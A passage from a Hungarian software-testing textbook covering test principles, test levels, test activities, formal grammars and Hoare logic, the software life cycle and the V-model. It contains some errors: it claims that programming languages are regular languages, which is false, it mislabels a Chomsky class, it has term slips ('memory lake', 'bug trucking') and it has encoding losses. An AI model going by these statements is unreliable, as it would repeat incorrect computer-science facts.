Szoftvertesztelés
Készítették:
Ficsor Lajos (4,5,7 fejezet)
Dr. Kovács László (1, 10 fejezet)
Krizsán Zoltán (8, 11 fejezet)
Dr. Kusper Gábor (1, 2, 3, 6, 9 fejezet)
 
 
Tartalomjegyzék
1 A tesztelés alapjai
2 Tesztelés a szoftver életciklusán át
3 Statikus technikák
4 Teszt tervezési technikák
5 Integrációs teszt
6 Biztonsági tesztelés
7 Tesztmenedzsment
8 Eszköztámogatás a tesztelésben
9 Hibakövetõ rendszerek
10 Adatbázisok tesztelése
11 Esettanulmány
1-1
1 A tesztelés alapfogalmai
Tesztelésre azért van szükség, hogy a szoftver termékben meglévõ hibákat még az üzembe
helyezés elõtt megtaláljuk, ezzel növeljük a termék minõségét, megbízhatóságát. Abban szinte
biztosak lehetünk, hogy a szoftverben van hiba, hiszen azt emberek fejlesztik és az emberek
hibáznak. Gondoljunk arra, hogy a legegyszerûbb programban, mondjuk egy szöveges menü
kezelésben, mennyi hibát kellett kijavítani, mielõtt mûködõképes lett. Tehát abban szinte biztosak
lehetünk, hogy tesztelés elõtt van hiba, abban viszont nem lehetünk biztosak, hogy tesztelés után
nem marad hiba. A tesztelés után azt tudjuk elmondani, hogy a letesztelt részekben nincs hiba, így
nõ a program megbízhatósága. Ez azt is mutatja, hogy a program azon funkcióit kell tesztelni,
amiket a felhasználók legtöbbször fognak használni.
1.1 A tesztelés alapelvei
A tesztelés alapjait a következõ alapelvekben foglalhatjuk össze:
1. A tesztelés hibák jelenlétét jelzi: A tesztelés képes felfedni a hibákat, de azt nem, hogy
nincs hiba. Ugyanakkor a szoftver minõségét és megbízhatóságát növeli.
2. Nem lehetséges kimerítõ teszt: Minden bemeneti kombinációt nem lehet letesztelni (csak
egy 10 hosszú karakterláncnak 256^10 lehetséges értéke van) és nem is érdemes.
Általában csak a magas kockázatú és magas prioritású részeket teszteljük.
3. Korai teszt: Érdemes a tesztelést az életciklus minél korábbi szakaszában elkezdeni, mert
minél hamar találunk meg egy hibát (mondjuk a specifikációban), annál olcsóbb javítani. Ez
azt is jelenti, hogy nemcsak programot, hanem dokumentumokat is lehet tesztelni.
4. Hibák csoportosulása: A tesztelésre csak véges idõnk van, ezért a tesztelést azokra a
modulokra kell koncentrálni, ahol a hibák a legvalószínûbbek, illetve azokra a bemenetekre
kell tesztelnünk, amelyre valószínûleg hibás a szoftver (pl. szélsõértékek).
5. A féregirtó paradoxon: Ha az újratesztelés során (lásd késõbb a regressziós tesztet) mindig
ugyanazokat a teszteseteket futtatjuk, akkor egy idõ után ezek már nem találnak több hibát
(mintha a férgek alkalmazkodnának a teszthez). Ezért a tesztjeinket néha bõvíteni kell.
6. A tesztelés függ a körülményektõl: Másképp tesztelünk egy atomerõmûnek szánt
programot és egy beadandót. Másképp tesztelünk, ha a tesztre 10 napunk vagy csak egy
éjszakánk van.
7. A hibátlan rendszer téveszméje: Hiába javítjuk ki a hibákat a szoftverben, azzal nem lesz
elégedett a megrendelõ, ha nem felel meg az igényeinek. Azaz használhatatlan szoftvert
nem érdemes tesztelni.
1.2 Tesztelési technikák
A tesztelési technikákat csoportosíthatjuk a szerint, hogy a teszteseteket milyen információ
alapján állítjuk elõ. E szerint létezik: 
1-2
• Feketedobozos (black-box) vagy specifikáció alapú, amikor a specifikáció alapján készülnek
a tesztesetek.
• Fehérdobozos (white-box) vagy strukturális teszt, amikor a forráskód alapján készülnek a
tesztesetek.
Tehát beszélünk feketedobozos tesztelésrõl, amikor a tesztelõ nem látja a forráskódot, de a
specifikációkat igen, fehérdobozos tesztelésrõl, amikor a forráskód rendelkezésre áll.
A feketedobozos tesztelést specifikáció alapúnak is nevezzük, mert a specifikáció alapján készül.
Ugyanakkor a teszt futtatásához szükség van a lefordított szoftverre. Leggyakoribb formája, hogy
egy adott bemenetre tudjuk, milyen kimenetet kellene adni a programnak. Lefuttatjuk a
programot a bemenetre és összehasonlítjuk a kapott kimenetet az elvárttal. Ezt alkalmazzák pl. az
ACM versenyeken is.
A fehérdobozos tesztelést strukturális tesztelésnek is nevezzük, mert mindig egy már kész
struktúrát, pl. program kódot, tesztelünk. A strukturális teszt esetén értelmezhetõ a (struktúra)
lefedettség. A lefedettség azt mutatja meg, hogy a struktúra hány százalékát tudjuk tesztelni a
meglévõ tesztesetekkel. Általában ezeket a struktúrákat teszteljük:
• kódsorok,
• elágazások,
• metódusok,
• osztályok,
• funkciók,
• modulok.
Például a gyakran használt unit-teszt a metódusok struktúra tesztje.
1.3 A tesztelés szintjei
A tesztelés szintjei a következõk:
• komponensteszt,
• integrációs teszt,
• rendszerteszt,
• átvételi teszt.
A komponensteszt csak a rendszer egy komponensét teszteli önmagában. Az integrációs teszt
kettõ vagy több komponens együttmûködési tesztje. A rendszerteszt az egész rendszert, tehát
minden komponenst együtt, teszteli. Ez elsõ három teszt szintet együttesen fejlesztõi tesztnek 
1-3
hívjuk, mert ezeket a fejlesztõ cég alkalmazottai vagy megbízottjai végzik. Az átvételi teszt során a
felhasználók a kész rendszert tesztelik. Ezek általában idõrendben is így követik egymást.
A komponensteszt a rendszer önálló részeit teszteli általában a forráskód ismeretében (fehér
dobozos tesztelés). Gyakori fajtái:
• unit-teszt,
• modulteszt.
A unit-teszt, vagy más néven egységteszt, a metódusokat teszteli. Adott paraméterekre ismerjük a
metódus visszatérési értékét (vagy mellékhatását). A unit-teszt megvizsgálja, hogy a tényleges
visszatérési érték megegyezik-e az elvárttal. Ha igen, sikeres a teszt, egyébként sikertelen. Elvárás,
hogy magának a unit-tesztnek ne legyen mellékhatása.
A unit-tesztelést minden fejlett programozási környezet (integrated development environment,
IDE) támogatja, azaz egyszerû ilyen teszteket írni. A jelentõségüket az adja, hogy a futtatásukat is
támogatják, így egy változtatás után csak lefuttatjuk az összes unit-tesztet, ezzel biztosítjuk
magunkat, hogy a változás nem okozott hibát. Ezt nevezzük regressziós tesztnek.
A modulteszt általában a modul nem-funkcionális tulajdonságát teszteli, pl. sebességét, vagy, hogy
van-e memóriaszivárgás (memory lake), van-e szûk keresztmetszet (bottleneck).
Az integrációs teszt során a komponensek közti interfészeket, az operációs rendszer és a rendszer
közti interfészt, illetve más rendszerek felé nyújtott interfészeket tesztelik. Az integrációs teszt
legismertebb típusai:
• Komponens – komponens integrációs teszt: A komponensek közötti kölcsönhatások tesztje
a komponensteszt után.
• Rendszer – rendszer integrációs teszt: A rendszer és más rendszerek közötti
kölcsönhatásokat tesztje a rendszerteszt után.
Az integrációs teszt az összeillesztés során keletkezõ hibákat keresi. Mivel a részeket más-más
programozók, csapatok fejlesztették, ezért az elégtelen kommunikációból súlyos hibák
keletkezhetnek. Gyakori hiba, hogy az egyik programozó valamit feltételez (pl. a metódus csak
pozitív számokat kap a paraméterében), amirõl a másik nem tud (és meghívja a metódust egy
negatív értékkel). Ezek a hibák kontraktus alapú tervezéssel (design by contract) elkerülhetõek.
Az integrációs teszteket érdemes minél hamarabb elvégezni, mert minél nagyobb az integráció
mértéke, annál nehezebb meghatározni, hogy a fellelt hiba (általában egy futási hiba) honnan
származik. Ellenkezõ esetben, azaz amikor már minden komponens kész és csak akkor tesztelünk,
akkor ezt a „nagy bumm tesztnek” (big bang tesztnek) nevezzük, ami rendkívül kockázatos.
A rendszerteszt a már kész szoftverterméket teszteli, hogy megfelel-e:
• a követelmény specifikációnak, 
1-4
• a funkcionális specifikációnak,
• a rendszertervnek.
A rendszerteszt nagyon gyakran feketedobozos teszt. Gyakran nem is a fejlesztõ cég, ahol esetleg
elfogultak a tesztelõk, hanem egy független cég végzi. Ilyenkor a tesztelõk és a fejlesztõk közti
kapcsolat tartást egy hibabejelentõ (bug trucking) rendszer látja el. A rendszerteszt feladata, hogy
ellenõrizze, hogy a specifikációknak megfelel-e a termék. Ha pl. a követelmény specifikáció azt írja,
hogy lehessen jelentést készíteni az éve forgalomról, akkor ezt a tesztelõk kipróbálják, hogy lehete, és hogy helyes-e a jelentés. Ha hibát találnak, azt felviszik a hibabejelentõ rendszerbe.
Fontos, hogy a rendszerteszthez használt környezet a lehetõ legjobban hasonlítson a megrendelõ
környezetére, hogy a környezet-specifikus hibákat is sikerüljön felderíteni.
Az átvételi teszt hasonlóan a rendszerteszthez az egész rendszert teszteli, de ezt már a
végfelhasználók végzik. Az átvételi teszt legismertebb fajtái a következõk:
• alfa teszt,
• béta teszt,
• felhasználói átvételi teszt,
• üzemeltetõi átvételi teszt.
Az alfa teszt a kész termék tesztje a fejlesztõ cégnél, de nem a fejlesztõ csapat által. Ennek része,
amikor egy kis segédprogram több millió véletlen egérkattintással ellenõrzi, hogy össze-vissza
kattintgatva sem lehet kifektetni a programot.
Ezután következik a béta teszt. A béta tesztet a végfelhasználók egy szûk csoportja végzi.
Játékoknál gyakori, hogy a kiadás elõtt néhány fanatikus játékosnak elküldik a játékot, akik rövid
alatt sokat játszanak vele. Cserébe csak azt kérik, hogy a felfedezett hibákat jelentsék.
Ezután jön egy sokkal szélesebb béta teszt, amit felhasználói átvételi tesztnek nevezünk. Ekkor már
az összes, vagy majdnem az összes felhasználó, megkapja a szoftvert és az éles környezetben
használatba veszi. Azaz installálják és használják, de még nem a termelésben. Ennek a tesztnek a
célja, hogy a felhasználók meggyõzõdjenek, hogy a termék biztonságosan használható lesz majd
éles körülmények között is. Itt már elvárt, hogy a fõ funkciók mind mûködjenek, de elõfordulhat,
hogy az éles színhelyen elõjön olyan környezet függõ hiba, ami a teszt környezetben nem jött elõ.
Lehet ez pl. egy funkció lassúsága.
Ezután már csak az üzemeltetõi átvételi teszt van hátra. Ekkor a rendszergazdák ellenõrzik, hogy a
biztonsági funkciók, pl. a biztonsági mentés és a helyreállítás, helyesen mûködnek-e.
1.4 A tesztelési tevékenység
Ugyanakkor a tesztelés nem csak tesztek készítésébõl és futtatásából áll. A leggyakoribb tesztelési
tevékenységek: 
1-5
• tesztterv elkészítése,
• tesztesetek tervezése,
• felkészülés a végrehajtásra,
• tesztek végrehajtása,
• kilépési feltételek vizsgálata,
• eredmények értékelése,
• jelentéskészítés.
A tesztterv fontos dokumentum, amely leírja, hogy mit, milyen céllal, hogyan kell tesztelni. A
tesztterv általában a rendszerterv része, azon belül is a minõségbiztosítás (quality assurance, QA)
fejezethez tartozik. A teszt célja lehet:
• megtalálni a hibákat,
• növelni a megbízhatóságot,
• megelõzni a hibákat.
A fejlesztõi tesztek célja általában minél több hiba megtalálása. Az átvételi teszt célja, hogy a
felhasználók bizalma nõjön a megbízhatóságban. A regressziós teszt célja, hogy megelõzni, hogy a
változások a rendszer többi részében hibákat okozzanak.
A tesztterv elkészítéséhez a célon túl tudni kell, hogy mit és hogyan kell tesztelni, mikor tekintjük a
tesztet sikeresnek. Ehhez ismernünk kell a következõ fogalmakat:
• A teszt tárgya: A rendszer azon része, amelyet tesztelünk. ez lehet az egész rendszer is.
• Tesztbázis: Azon dokumentumok összessége, amelyek a teszt tárgyára vonatkozó
követelményeket tartalmazzák.
• Tesztadat: Olyan adat, amivel meghívjuk a teszt tárgyát. Általában ismert, hogy milyen
értéket kellene erre adnia a teszt tárgyának vagy milyen viselkedést kellene produkálnia. Ez
az elvárt visszatérési érték, illetve viselkedés. A valós visszatérési értéket, illetve viselkedést
hasonlítjuk össze az elvárttal.
• Kilépési feltétel: Minden tesztnél elõre meghatározzuk, mikor tekintjük ezt a tesztet
lezárhatónak. Ezt nevezzük kilépési feltételnek. A kilépési feltétel általában az, hogy
minden tesztest sikeresen lefut, de lehet az is, hogy a kritikus részek tesztlefedettsége
100%.
A tesztterv leírja a teszt tárgyát, kigyûjti a tesztbázisból a teszt által lefedett követelményeket,
meghatározza a kilépési feltételt. A tesztadatokat általában csak a teszteset határozzák meg, de
gyakran a tesztesetek is részei a teszttervnek. 
1-6
A tesztesetek leírják, hogy milyen tesztadattal kell meghajtani a teszt tárgyát. Illetve, hogy mi az
elvárt visszatérési érték vagy viselkedés. A tesztadatok meghatározásához általában úgynevezett
ekvivalencia-osztályokat állítunk fel. Egy ekvivalencia-osztály minden elemére a szoftver
ugyanazon része fut le. Természetesen más módszerek is léteznek, amikre késõbb térünk ki.
A tesztesetek végrehajtásához teszt környezetre van szükségünk. A teszt környezet kialakításánál
törekedni kell, hogy a lehetõ legjobban hasonlítson az éles környezetre, amely a végfelhasználónál
mûködik. A felkészülés során írhatunk teszt szkripteket is, amik az automatizálást segítik.
A tesztek végrehajtása során teszt naplót vezetünk. Ebbe írjuk le, hogy milyen lépéseket hajtottunk
végre és milyen eredményeket kaptunk. A tesz napló alapján a tesztnek megismételhetõnek kell
lennie. Ha hibát találunk, akkor a hibabejelentõt a teszt napló alapján töltjük ki.
A tesztek után meg kell vizsgálni, hogy sikeresen teljesítettük-e a kilépési feltételt. Ehhez a
tesztesetben leírt elvárt eredményt hasonlítjuk össze a teszt naplóban lévõ valós eredménnyel a
kilépési feltétel alapján. Ha kilépési feltételek teljesülnek, akkor mehetünk tovább. Ha nem, akkor
vagy a teszt tárgya, vagy a kilépési feltétel hibás. Ha kell, akkor módosítjuk a kilépési feltételt. Ha
teszt tárgya hibás, akkor a hibabejelentõ rendszeren keresztül értesítjük a fejlesztõket. A teszteket
addig ismételjük, míg mindegyik kilépési feltétele igaz nem lesz.
A tesztek eredményei alapján további teszteket készíthetünk. Elhatározhatjuk, hogy a megtalált
hibákhoz hasonló hibákat felderítjük. Ezt általában a teszttervek elõ is írják. Dönthetünk úgy, hogy
egy komponenst nem érdemes tovább tesztelni, de egy másikat tüzetesebben kell tesztelni. Ezek a
döntések a teszt irányításához tartoznak.
Végül jelentést kell készítenünk. Itt arra kell figyelnünk, hogy sok programozó kritikaként éli meg,
ha a kódjában a tesztelõk hibát találnak. Úgy érzi, hogy rossz programozó és veszélyben van az
állása. Ezért a tesztelõket nem várt támadások érhetik. Ennek elkerülésére a jelentésben nem
szabad személyeskedni, nem muszáj látnia fõnöknek, kinek a kódjában volt hiba. A hibákat rá lehet
fogni a rövid idõre, a nagy nyomásra. Jó, ha kiemeljük a tesztelõk és a fejlesztõk közös célját, a
magas minõségû, hibamentes szoftver fejlesztését.
1.5 A programkód formális modellje
Számos tesztelési módszer a program forráskódjának elemzésén alapul. Ez az alpont a vonatkozó
legfontosabb alapismereteket foglalja össze.
A programozási nyelvek egyik fontos jellemzõje a szigorú szerkezet, a viszonylag egyszerûbb
strukturáltság. Mindkét jellemzõ abból fakad, hogy olyan nyelvet lehet automatikus feldolgozásra,
értelmezésre kiválasztani, amely
• hatékonyan feldolgozható egy automatával;
• elegendõ kifejezõ ereje van az algoritmusok leírására.
A programnyelvek egy mesterséges nyelvnek tekinthetõk, melyek teljesítik a fenti feltételeket. A
programozási nyelvek elméleti hátterét a formális nyelvek területe fedi le. 
1-7
1.5.1 A forráskód szintaktikai ellenõrzése
Az formális nyelvek mondatok szavakból, jelekbõl történõ felépítését írják le. Formálisan a formális
nyelv egy párossal írható le, melyben adott az alapjelek halmaza és a képezhetõ, elfogadott
mondatok halmaza. A mondatok halmaza az összes képezhetõ véges jelsorozatok halmazának
részhalmazaként értelmezhetõ.
?: jelek halmaza
 L ? ?* : nyelv
A nyelvek esetében egy nyelvtan írja le a jelhalmazból képzett és a nyelv által elfogadott mondatok
halmazát. A nyelvtan leírja a mondatok képzési szabályait. A szabályok alapvetõen
 A › B
alakúak, ahol a szimbólumok mondat egységeket jelölnek. A szimbólumok vonatkozásában
megkülönböztetünk
• atomi szimbólumokat (ezek a jelek, a ? elemei)
• összetett szimbólumokat (nagyobb egységeket fog össze)
A nyelvtan formális alakja az alábbi kifejezéssel adható meg
 G = (T, N, R, S)
ahol
• T : atomi, terminális szimbólumok halmaza
• N: összetett szimbólumok halmaza
• R: szabályok halmaza
• S: mondat szimbólum, mely az N eleme.
Az egyes nyelvtanok lényegesen különbözhetnek egymástól a szabályok összetettségét tekintve. A
formális nyelvek nyelvtanának legismertebb osztályozási rendszere a Chomsky kategorizálás. A
Chomsky hierarchia négy nyelvtan osztályt különböztet meg: 
1-8

• reguláris nyelvek: a szabályok A › aB alakúak;
• környezet függõ nyelvek: a szabályok A › X* alakúak;
• környezet függõ nyelvek: a szabályok UAV › UX*V alakúak;
• általános nyelvek: nincs megkötés a szabályokra.
A kifejezésekben a kisbetûs elemek atomi szimbólumot, a nagybetûs elemek összetett
szimbólumokat jelölnek. Az X egy tetszõleges szimbólum.
A programozási nyelvek alapvetõen a reguláris nyelvek osztályába tartoznak. Egy SQL DELETE
parancs esetében például az alábbi szabályokat kell alkalmazni, ahol a példában egy –egy szót is
atomi szimbólumnak tekintünk.
 S = delete R
 R = from Q
 Q = ?tabla P
 Q = ?tabla
 P = where O
 O = ?feltétel
A mintában a ? jel mögött egy újabb egység van, melyhez önálló saját értelmezési nyelvtan
tartozik.
A nyelvtan alapján egy bejövõ mondathoz meghatározható, hogy illeszkedik-e a megadott
nyelvtanra vagy sem. A reguláris nyelvtanok esetében az ellenõrzés egyik lehetséges eszköze egy
FSA automata alkalmazása.
A véges automaták olyan rendszert jelentenek, mely tartalmaz
• állapot elemeket (az elemzés egyes fázisait szimbolizálják)
• állapot átmeneteket
• eseményeket
Az események az egyes állapot átmenetekhez köthetõk. Az automata mûködési elve az alábbi
alapelemeken nyugszik: 
1-9
• induláskor egy induló állapotban van a rendszer
• egy esemény bekövetkezésekor állapot átmenet valósul meg: az aktuális állapotból azon
átmeneten megy tovább, melyhez a bejövõ esemény tartozik
• az automata egy végállapot elérésekor áll le
A szintaktika ellenõrzéskor a végállapot lehet egy elfogadó vagy egy elvetõ (hiba) állapot.
Az automaták a mûködés jellege szerint több csoportba kategorizálhatjuk, fõ típusai:
• véges automata
• determinisztikus automata
• fuzzy automata
Az elõzõekben ismertetett reguláris nyelvek megvalósíthatók véges automatákkal így az
értelmezés folyamata egy automatával végrehajtható. Az automata mûködési modellje egy
táblázattal foglalható össze, melyben az alábbi oszlopok szerepelnek:
• induló állapot
• esemény
• célállapot
Az esemény a forráskód elemzésénél a soron következõ beolvasott jelet (szót) jelöli. A DELETE
parancs setében az alábbi táblázat alapján mûködhet az értelmezõ:
S delete R
S * Hiba!
R from Q
R * Hiba!
Q ?tábla P
Q * Hiba!
P # OK!
P where O
P * Hiba!
O ?feltétel OK!
O * Hiba! 
1-10
A táblázatban * jel jelöli az egyéb eseményeket és # jel a mondat vége eseménynek felel meg.
1.5.2 Forráskód szemantikai ellenõrzése
A szintaktikai elemzés azt vizsgálja, hogy a kód, mint mondatok sorozata érvényes-e, megfelel-e a
nyelvtan szabályainak. A nyelvtanilag érvényes mondatsor azonban nem biztos, hogy az elvárt
tartalmú tevékenységet végzi el. Emiatt a szintaktikai helyesség nem garantálja a tartalmi,
szemantikai helyességet.
A szemantikai helyesség ellenõrzése sokkal összetettebb feladat, mint a szintaktika ellenõrzése,
hiszen nem áll rendelkezésre olyan szemantikai nyelvtan, amellyel össze lehetne vetni a leírt
kódot. A kód ugyan karaktersorozatnak fele meg a forrásállományban, de a tartalom
szempontjából más egységek strukturálható. A kód szokásos reprezentációs alakjai:
• szavak sorozata (szintaktikai ellenõrzéshez),
• utasítások hierarchiája,
• végrehajtási gráf.
•
A hierarchia reprezentáció arra utal, hogy a szavakból rendszerint egy nagyobb utasítás egység áll
össze, és az utasítások legtöbbször egymásba ágyazhatók. A fontosabb algoritmus szerkezeti
elemek:
• modul (rutin)
• szekvencia
• elágazás
• ciklus
A hierarchikus szerkezetet jelzi, hogy egy elágazás tartalmazhat
• szekvenciát,
• elágazást,
• ciklust.
Tehát a program algoritmusa strukturálisan rekurzív felépítésû. A algoritmus megadása mellet a
program másik fõ egysége az adatstruktúra leírása. Az adatstruktúra esetében is ez hierarchikus
szerkezettel találkozhatunk. A fõbb adattárolási egységek:
• skalár
• tömb
• halmaz 
1-11
• rekord
• fa
Itt is igaz, hogy egyes egységek más adatelemeket magukba foglalhatnak.
A hierarchia reprezentáció a program statikus szerkezeté írja le, a program azonban egy
végrehajtási szerkezet ad meg. A program hagyományos végrehajtása során mindig van egy
kitüntetett utasítás, mely végrehajtás alatt áll. Ez az aktuális utasítás vándorol a program futása
alatt. Egy adott utasításból egy vagy több más utasításba kerülhet át a vezérlés.
A végrehajtási gráf formalizmusban az egyes utasításokat mint csomópontokat vesszük, és a
vezérlés átadásokat a gráf éleit szimbolizálják. A gráfban található egy jelölõ elem, token, mely
mutatja az aktuális utasítás helyét. A program futása jól nyomon követhetõ a gráfban a token
mozgását követve. A gráf formalizmus tehát a program dinamikus jellegét mutatja.
A program helyességének biztosítása a szoftverfejlesztés egyik legfontosabb feladata. A tesztelés
folyamata, mely során ellenõrzésre kerül a program helyessége sokféleképpen értelmezhetõ. A
tesztelést végezhetõ szisztematikus próbálkozásokkal is, de ha nem sikerül minden lehetséges
esetet lefedni, akkor ez a módszer nem garantálhatja a program teljeskörû helyességét. Csak
olyam megoldás adhat biztonságot, amely bizonyíthatóan le tudja fedni a lehetséges eseteket.
Érezhetõ, ezen igényt csak egy matematikailag megalapozott módszer tudná biztosítani. Érdekes
kérdés, hogy van-e ilyen matematikai formalizmus és az vajon alkalmazható-e a gyakorlati méretû
feladatokban. A következõ részben a tesztelés formális megközelítésének alapjait tekintjük át
röviden.
A formális tesztelés elméleti alapjait Hoare fektette le 1969-ben, bevezetve az axiomatikus
szemantika terület fogalmát, melynek célja a programok viselkedésének leírása és helyességük
bizonyítása.
Az axiomatikus szemantika alapvetõen a matematikai logika eszközrendszerére épül és egyik
alapeleme a megkötés, assertion fogalma. Az assertion egy olyan állítás, predikátum, amelyet a
programnak valamely pontjában teljesítenie kell. A modell további lényeges elemei az
elõfeltételek (precondition) és az végfeltételek (postcondition). A módszer tehát nem önmagában
vizsgálja a program helyességét, keretfeltételek mellett végzi az ellenõrzést. Felteszi, hogy indulás
elõtt igaz a precondition és végén teljesülnie kell a postcondition megkötésnek. A program tehát
egy
 {P} s {Q}
hármassal adott, ahol
 P : precondition
 s : source (forráskód)
 Q: postcondition. 
1-12
Természetesen a P és Q részek lehetnek mindig teljesülõ kifejezések is. A Hoare formalizmus célja
a program részleges helyességének ellenõrzése, tehát annak bizonyítása, hogy ha P teljesül, akkor
az s végrehajtása után Q is teljesülni fog.
A módszer a matematikai logika eszközrendszerére alapozva P-bõl kiindulva az s elemeinek
felhasználásával levezeti a Q helyességét. A levezetés logikában megszokott implikációs
szabályokra épít, melyeket
 (p1,p2,p3,… ) › q
 alakban lehet megadni és azt jelzi, hogy ha teljesülnek a p1,p2,p3 … logikai kifejezések, akkor a q
állítás is teljesül. A levezetési szabályok egy s program esetén az alábbi típusokat fedik le:
- hozzárendelés (assignment rule)
- szekvencia (sequence rule)
- ugrás (skip rule)
- feltételes elágazás (conditional rule)
- ciklus (loop rule)
Mivel a Q levezetése a P-bõl több lépésen keresztül történhet csak, a bizonyítás egy levezetési
fával írható le.
Példaként a feltételes utasításhoz tartozó szabályt véve, az implikáció a következõ alakot ölti:
({t ? P} s1 {Q}, {¬ t ? P} s2 {Q} ) › {P} if (t) s1 else s2 {Q}
A feldolgozás egy további eleme a feltételek erõsítése vagy gyengítése. A precondition erõsítése
formalizmusa:
 ( P ? P’, {P’}s{Q}) ›{P} s {Q}
Például ez alapján vezethetõ le az alábbi összefüggés:
( a > b ? a = max(a,b), {a = max(a,b)} m = a{m = max(a,b)}) ›
{a>b} m=a {m=max(a,b)}
A fenti példákból is jól látható, hogy a Hoare formalizmus a helyesség ellenõrzését igen absztrakt
szinten végzi és igen körülményes és költséges a levezetési fa felépítése. Emiatt a módszert
napjainkban még csak kisebb méretû feladatoknál alkalmazzák és a gyakorlati rendszerekben
döntõen a heurisztikus módszerek dominálnak.
 
1-13
Tartalomjegyzék
1 A tesztelés alapfogalmai .......................... ................................................... .............................. 1-1
1.1 A tesztelés alapelvei ............................. ................................................... ........................... 1-1
1.2 Tesztelési technikák .............................. ................................................... ........................... 1-1
1.3 A tesztelés szintjei .............................. ................................................... ............................. 1-2
1.4 A tesztelési tevékenység ............................................................................. ....................... 1-4
1.5 A programkód formális modellje ....................................................................... ................ 1-6
1.5.1 A forráskód szintaktikai ellenõrzése ................................................................. .......... 1-7
1.5.2 Forráskód szemantikai ellenõrzése .................................................................... ....... 1-10
2-1
2 A tesztelés helye a szoftver életciklusában
Ebben a fejezetben röviden áttekintjük a szoftver életciklusát és az ezt meghatározó
legfontosabb módszertanokat. Külön kiemeljük a tesztelés helyét az életciklusban és a
módszertanokban is.
2.1 A szoftverkrízis
A tesztelés szükségességét, mint annyi mást, a szoftverkrízis (software crisis) húzta alá. A
szoftverkrízis alatt azt értjük, hogy a szoftver projektek jelentõs része sikertelen. Sikertelen a
következõ értelemben:
• Vagy a tervezettnél drágábban készül el (over budget),
• Vagy a tervezetnél hosszabb idõ alatt (over time),
• Vagy nem az igényeknek megfelelõ,
• Vagy rossz minõségû / rossz hatásfokú / nehezen karbantartható,
• Vagy anyagi / környezeti / egészségügyi kárhoz vezet,
• Vagy átadásra sem kerül.
Ezek közül a tesztelés a minõségi problémákra ad választ, illetve a károkozás megelõzésében
segít. Tehát tesztelésre azért van szükség, hogy a szoftver termékben meglévõ hibákat még
az üzembe helyezés elõtt megtaláljuk, ezzel növeljük a termék minõségét, megbízhatóságát.
Abban szinte biztosak lehetünk, hogy a szoftverben van hiba, hiszen azt emberek fejlesztik és
az emberek hibáznak. Gondoljunk arra, hogy a legegyszerûbb programban, mondjuk egy
szöveges menü kezelésben, mennyi hibát kellett kijavítani, mielõtt mûködõképes lett. Tehát
abban szinte biztosak lehetünk, hogy tesztelés elõtt van hiba, abban viszont nem lehetünk
biztosak, hogy tesztelés után nem marad hiba. A tesztelés után azt tudjuk elmondani, hogy a
letesztelt részekben nincs hiba, így nõ a program megbízhatósága. Ez azt is mutatja, hogy a
program azon funkcióit kell tesztelni, amiket a felhasználók legtöbbször fognak használni.
2.2 A szoftver életciklusa
A szoftver életciklus (Software Development Life Cycle (SDLC)) a szoftverrel egy idõs
fogalom. Ha átadunk egy szoftvert a felhasználóknak, akkor a felhasználók elõbb vagy utóbb
újabb igényekkel állnak elõ, ami a szoftver továbbfejlesztését teszi szükségessé. Tehát egy
szoftver soha sincs kész, ciklikusan meg-megújul. Ezt nevezzük életciklusnak.
Az életciklus lépéseit a módszertanok határozzák meg. Ezeket késõbb fejtjük ki. Itt egy
általános életciklust tekintünk át.
A szoftverfejlesztés életciklusa (zárójelben a legfontosabb elkészítendõ termékek): 
2-2
• A felhasználókban új igény merül fel.
• Az igények, követelmények elemzése, meghatározása (követelmény specifikáció).
• Rendszerjavaslat kidolgozása (funkcionális specifikáció, szerzõdéskötés).
• Rendszerspecifikáció (megvalósíthatósági tanulmány, nagyvonalú rendszerterv).
• Logikai és fizikai tervezés (logikai- és fizikai rendszerterv).
• Implementáció (szoftver).
• Tesztelés (tesztterv, tesztesetek, teszt napló, validált szoftver).
• Rendszerátadás és bevezetés (felhasználói dokumentáció).
• Üzemeletetés és karbantartás (rendszeres mentés).
• A felhasználókban új igény merül fel.
. ábra Életciklus
Látható, hogy az elsõ lépés és az utolsó ugyanaz. Ez biztosítja a ciklikusságot. Elvileg egy
hasznos szoftvernek végtelen az életciklusa. Gyakorlatilag a szoftver és futási környezete 
2-3
elöregszik. Elõbb-utóbb már nem lesz programozó, aki ismerné a programozási nyelvet, amin
íródott (ilyen probléma van manapság a COBOL programokkal), a futtató operációs
rendszerhez nincsenek frissítések, a meghibásodott hardver elemeket nem lehet pótolni. Az
ilyen IT rendszereket hívjuk „legacy system”-nek (kiöregedett, hagyaték rendszernek).
Valahol itt van vége az életciklusnak. Az életciklus egyes lépéseit részletesebben is kifejtjük.
2.3 Módszertanok
A módszertanok feladata, hogy meghatározzák, hogy a szoftver életciklus egyes lépései
milyen sorrendben követik egymást, milyen dokumentumokat, szoftver termékeket kell
elõállítani és hogyan. Egy nagy szabálykönyvre emlékeztetnek, ami pontosan leírja, hogyan
kell szoftvert „fõzni”. Ha betartjuk a receptet, akkor egy átlagos minõségû szoftvert kapunk,
de az átlagos minõség garantált.
A következõkben azokat a módszertanokat ismertetjük, amelyek különösen nagy hangsúlyt
fektetnek a tesztelésre.
2.4 V-modell
A V-modell (angolul: V-Model vagy Vee Model) a nevét onnan kapta, hogy két szára van és
így egy V betûhöz hasonlít. Az egyik szára megegyezik a vízesés modellel. Ez a fejlesztési szár.
A másik szára a létrejövõ termékek tesztjeit tartalmazza. Ez a tesztelési szár. Az egy szinten
lévõ fejlesztési és tesztelési lépések összetartoznak, azaz a tesztelési lépés a fejlesztési lépés
során létrejött dokumentumokat használja, vagy a létrejött terméket teszteli. Ennek
megfelelõen az elõírt fejlesztési és tesztelési lépések a következõk: 
2-4
A V-modell a vízesés modell kiegészítése teszteléssel. Ez azt jelenti, hogy elõször végre kell
hajtani a fejlesztés lépéseit, ezután jönnek a tesztelés lépései. Ha valamelyik teszt hibát talál,
akkor vissza kell menni a megfelelõ fejlesztési lépésre.
A V-modell hasonlóan a vízesés modellhez nagyon merev, de alkalmazói kevésbé
ragaszkodnak ehhez a merevséghez, mint a vízesés modell alkalmazói. Ennek megfelelõen
jobban elterjedt. Fõ jellemzõje a teszt központi szerepe.
Egy tipikus V-modell változatban elõször felmérjük az igényeket és elkészítjük a követelmény
specifikációt. Ezt üzleti elemzõk végzik, akik a megrendelõ és a fejlesztõk fejével is képesek
gondolkozni. A követelmény specifikációban jól meghatározott átvételi kritériumokat
fogalmaznak meg, amik lehetnek funkcionális és nemfunkcionális igények is. Ez lesz majd az
alapja a felhasználói átvételi tesztnek (User Acceptance Test, UAT). Magát a követelmény
specifikációt is tesztelik. A felhasználók tüzetesen átnézik az üzleti elemzõk segítségével,
hogy ténylegesen minden igényüket lefedi-e a dokumentum. Ez lényeges része a modellnek,
